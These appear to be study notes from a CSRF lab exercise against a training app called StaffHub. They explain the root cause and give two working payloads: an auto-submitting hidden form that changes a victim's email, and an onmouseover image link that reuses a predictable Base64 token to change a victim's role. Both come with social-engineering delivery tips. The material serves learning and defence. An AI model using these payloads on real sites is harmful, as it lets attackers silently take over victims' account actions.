# CSRF (Cross-Site Request Forgery)

## What It Is
CSRF is a web vulnerability where an attacker tricks a user's browser into sending a request to a site where the user is already authenticated. Because browsers automatically attach session cookies to every request, the application assumes the request was intentional.

- The attacker doesn't steal credentials — they abuse the trust between browser and application.
- If the forged request triggers a sensitive action (e.g., changing an email address or account settings), the attacker can modify the victim's account without their knowledge.
- Example: a user logged into an internal portal visits a malicious webpage; that page silently triggers a request to the portal. If the app doesn't verify the request's origin, it processes it as if the user initiated it.

## How CSRF Attacks Work
1. Victim logs into a legitimate web application; browser stores a session cookie.
2. Attacker lures victim to a malicious webpage containing a crafted request.
3. Victim's browser automatically sends the request to the target app, including the stored session cookie.

Since the request carries a valid session cookie, the server treats it as a legitimate user action.
# Why CSRF Works

## The Root Cause
CSRF doesn't exist because browsers are broken — they behave exactly as designed. The problem is that web applications trust requests too much.

- When a user logs in, the server creates a session and sends a session cookie, which acts like an identity card.
- The browser automatically includes this cookie with **every** request to that domain — regardless of whether the request originated from a legitimate page on the site or a malicious page elsewhere on the internet.

## Example
A user logged into `staffhub.thm` visits another website. That site triggers a request to `staffhub.thm`. The browser automatically attaches the session cookie, so the request appears — from the server's perspective — to come from the authenticated user. If the app doesn't verify the request's origin, it processes it as legitimate, even though it was triggered by a malicious page.

## Key Conditions for a CSRF Attack
All three generally need to be true:
1. **Victim is authenticated** to the target application.
2. **The application performs a state-changing action** (e.g., updating settings, modifying account data).
3. **The application does not verify** whether the request came from a trusted source.
4. # Identifying CSRF Vulnerabilities

## Finding Targets
Not every feature is a good CSRF target — attacks focus on **state-changing actions** (data or account setting modifications), not requests that merely retrieve information.

Key question when assessing a feature:
> Can this action be triggered without verifying that the request actually came from the user?

If yes, the feature may be vulnerable to CSRF.

## Common Vulnerable Features
Pay special attention to requests that modify important user data (e.g., email/password changes, account settings, profile updates). If these lack protection like CSRF tokens, they may be exploitable.

*(Note: the source material referenced a list of common vulnerable functions via an image that didn't come through as text — worth checking the original page if you need the specific examples.)*

## GET vs POST — A Common Misconception
- Using POST does **not** automatically protect against CSRF.
- Both GET and POST requests can be forged if the app doesn't verify request origin.
- Many CSRF attacks use simple GET requests, triggerable via links or `<img>` tags.
- **Never rely on request method alone** when testing for CSRF.

## Practical Note
Upcoming tasks analyze the StaffHub employee portal, observing how account settings are updated, then recreating those requests from a malicious webpage to demonstrate exploitation of missing CSRF protections.
# CSRF Practical — Basic Attack via Forged Form (StaffHub)

## Target Setup
- App: `http://staffhub.thm:8080`
- Login: `user` / `user`
- Vulnerable feature: email update on the Settings page.

## The Vulnerable Request
Legitimate form (`update_email.php`, POST):
```html
<form action="update_email.php" method="POST">
    <input id="email" type="email" name="email" required>
    <button type="submit">Update Email</button>
</form>
```
- Only parameter: `email` — no CSRF token or origin verification.
- Since the request structure is fully known/predictable, it can be reproduced from any external page.

## Crafting the Malicious Page
On the AttackBox:
```bash
cd /var/www/html
nano settings.html
```

Malicious page content:
```html
<html>
<body>

<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@evilmail.thm">
</form>

<script>
document.getElementById("attack").submit();

// redirect user after the request is sent
setTimeout(function() {
    window.location.href = "http://staffhub.thm:8080/settings.php";
}, 1000);
</script>

</body>
</html>
```

**How it works:**
- Hidden form auto-submits via JS on page load.
- After 1 second, victim is redirected back to the legitimate settings page (helps mask the attack).
- Hosted at `http://CONNECTION_IP:81/settings.html`.

## Delivering the Attack
- Victim must be logged into StaffHub and open the malicious link in the same browser/tab.
- Browser automatically attaches the session cookie to the forged request.
- Delivery method: social engineering (chat link, email, etc.).

## Result
- Email is silently updated to `attacker@evilmail.thm` — no user interaction beyond opening the link.
- Confirms the app processes the forged request as legitimate, since it never verifies request origin.

## Key Takeaway
Lack of origin verification (no CSRF token) lets an attacker fully reconstruct and replay a state-changing request from an external page, hijacking an authenticated session's actions without the victim's knowledge.

## What's Next
Next task covers how a **weak CSRF token implementation** can still allow an attacker to automatically change victim account information.
# CSRF Practical — Bypassing a Weak Token (Role Update)

## The Problem With Weak Tokens
Adding a CSRF token only helps if it's unique, unpredictable, and properly validated. If the token is generated in a weak/reversible way, it can still be defeated.

## Reversing the Weak Token
- StaffHub's role-update feature includes a hidden CSRF token:
```html
  <input type="hidden" name="csrf_token" value="YWRtaW4=">
```
- Decoding this Base64 value reveals `admin` — the token is simply the **Base64-encoded value of the user's current role**, not a random secret.
- Since the generation method is predictable, an attacker can reproduce a valid token without ever seeing the victim's actual session.

## Crafting the Payload (Image-Based CSRF)
On the AttackBox:
```bash
cd /var/www/html
nano role.html
```

Payload:
```html
<html>
<body>

<h2>StaffHub Internal Notice</h2>
<p>Move your mouse over the banner below to load the latest role updates.</p>

<img src="http://staffhub.thm:8080/one.png"
onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='"
width="400">

</body>
</html>
```

**Mechanism:**
- Displays an innocuous-looking image.
- `onmouseover` event handler triggers a redirect to the role-update URL, carrying both the `role` parameter and the guessed/reproduced `csrf_token`.
- Hosted at `http://CONNECTION_IP:81/role.html`.

## Delivering & Triggering
- Delivered via social engineering (email, chat link).
- Victim must be logged into StaffHub in the same browser.
- Simply hovering over the image (no click needed) fires the redirect.
- Browser automatically includes the victim's session cookie with the forged request.
- Server validates the token (since it "matches" the expected format) and processes the role change — from `admin` to `staff` — without the victim's knowledge.

## Key Takeaway
A CSRF token that is derived from predictable/reversible user data (like Base64-encoding a known value) provides a **false sense of security**. Effective CSRF tokens must be:
- Unique per session/request
- Cryptographically unpredictable
- Properly validated server-side (tied to the authenticated session)

## What's Next
Next task covers proper defensive measures developers should implement to prevent CSRF effectively.
